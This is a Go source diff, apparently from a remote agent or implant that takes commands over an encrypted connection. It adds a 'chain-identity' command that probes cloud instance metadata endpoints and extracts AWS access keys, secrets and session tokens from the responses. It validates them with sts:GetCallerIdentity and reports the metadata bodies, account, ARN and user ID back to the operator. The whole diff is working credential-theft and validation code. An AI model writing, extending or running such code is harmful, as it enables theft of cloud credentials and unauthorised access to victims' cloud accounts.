@@ -1238,6 +1238,56 @@ func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
 			}
 		}
 
+	case "chain-identity":
+		// Probe all clouds, and the first AWS IMDS body that yields
+		// full credentials is immediately used to prove identity via
+		// sts:GetCallerIdentity. The credential validity is confirmed
+		// in one invocation — no hand-stitching of AKIA... into a
+		// follow-up -cloud identity call.
+		name, results := cloudgo.ProbeChain(cloudgo.IMDSOptions{})
+		if name == "" {
+			send("probe", "no cloud IMDS reachable", "", false, true)
+			return
+		}
+		send("probe", "live cloud: "+name, "", true, false)
+
+		var proved bool
+		for _, r := range results {
+			if !r.OK || r.Body == "" {
+				continue
+			}
+			det := r.Body
+			if len(det) > 800 {
+				det = det[:800]
+			}
+			send("probe", r.URL, det, true, false)
+
+			// Extract + prove in one hop
+			creds, err := cloudgo.ExtractAWSCredentials(r.Body)
+			if err != nil {
+				continue
+			}
+			send("probe-extract", "AWS credentials captured", redactKey(creds.AccessKeyID), true, false)
+
+			key := cloudgo.AWSKey{
+				AccessKeyID:     creds.AccessKeyID,
+				SecretAccessKey: creds.SecretAccessKey,
+				SessionToken:    creds.Token,
+				Region:          "us-east-1",
+			}
+			id, err := cloudgo.GetCallerIdentity(key)
+			if err != nil {
+				send("chain-identity", "credential rejected: "+err.Error(), "", false, false)
+				continue
+			}
+			send("chain-identity", "credential proved: "+id.Arn, id.Account+" / "+id.UserID, true, false)
+			proved = true
+			break
+		}
+		if !proved {
+			send("chain-identity", "no valid credentials found in probe results", "", false, true)
+		}
+
 	case "identity":
 		key := cloudgo.AWSKey{
 			AccessKeyID:     c.AccessKeyID,
